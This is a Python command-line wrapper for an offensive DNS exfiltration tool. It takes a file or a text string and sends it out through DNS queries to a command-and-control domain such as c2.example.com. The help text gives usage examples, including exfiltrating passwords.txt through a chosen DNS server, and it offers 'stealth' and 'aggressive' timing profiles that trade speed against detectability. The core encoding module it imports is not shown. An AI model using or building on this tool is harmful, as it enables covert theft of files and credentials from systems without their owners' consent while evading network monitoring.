#!/usr/bin/env python3
"""
Command-line interface for DNS exfiltration
"""

import argparse
import sys
from .core import DNSExfiltration

def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description="DNS Exfiltration Engine - Exfiltrate data via DNS queries",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Exfiltrate text data
  dns_exfil.py --domain c2.example.com --data "secret information"
  
  # Exfiltrate file
  dns_exfil.py --domain c2.example.com --file passwords.txt
  
  # Use custom DNS server
  dns_exfil.py --domain c2.example.com --dns-server 10.10.14.5 --file data.txt
  
  # Stealth mode (slower, less detectable)
  dns_exfil.py --domain c2.example.com --file data.txt --stealth
  
  # Aggressive mode (faster, more detectable)
  dns_exfil.py --domain c2.example.com --file data.txt --aggressive
  
  # With metadata queries
  dns_exfil.py --domain c2.example.com --file data.txt --metadata
  
  # Test DNS connectivity
  dns_exfil.py --domain c2.example.com --test
        """
    )
    
    parser.add_argument('--domain', type=str, required=True,
                       help='Exfiltration domain (e.g., c2.example.com)')
    parser.add_argument('--dns-server', type=str,
                       help='DNS server IP (uses system default if not specified)')
    parser.add_argument('--data', type=str,
                       help='Data to exfiltrate')
    parser.add_argument('--file', type=str,
                       help='File to exfiltrate')
    parser.add_argument('--chunk-size', type=int, default=50,
                       help='Chunk size in bytes (max 50, default: 50)')
    parser.add_argument('--metadata', action='store_true',
                       help='Send metadata queries (session info, completion signal)')
    parser.add_argument('--aggressive', action='store_true',
                       help='Aggressive timing (fast, more detectable)')
    parser.add_argument('--stealth', action='store_true',
                       help='Stealth timing (slow, less detectable)')
    parser.add_argument('--test', action='store_true',
                       help='Test DNS connectivity')
    
    args = parser.parse_args()
    
    try:
        # Initialize DNS exfiltration
        dns_exfil = DNSExfiltration(
            domain=args.domain,
            dns_server=args.dns_server,
            chunk_size=args.chunk_size
        )
        
        # Set timing profile
        if args.aggressive:
            dns_exfil.set_timing_profile('aggressive')
        elif args.stealth:
            dns_exfil.set_timing_profile('stealth')
        
        # Test connectivity
        if args.test:
            success = dns_exfil.test_dns_connectivity()
            return 0 if success else 1
        
        # Exfiltrate data
        if args.data:
            success = dns_exfil.exfiltrate_data(args.data, send_metadata=args.metadata)
        elif args.file:
            success = dns_exfil.exfiltrate_file(args.file, send_metadata=args.metadata)
        else:
            print("[-] Must specify --data or --file")
            parser.print_help()
            return 1
        
        return 0 if success else 1
    
    except FileNotFoundError as e:
        print(f"\n[-] Error: {e}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print(f"\n[!] Interrupted by user")
        return 1
    except Exception as e:
        print(f"\n[-] Error: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())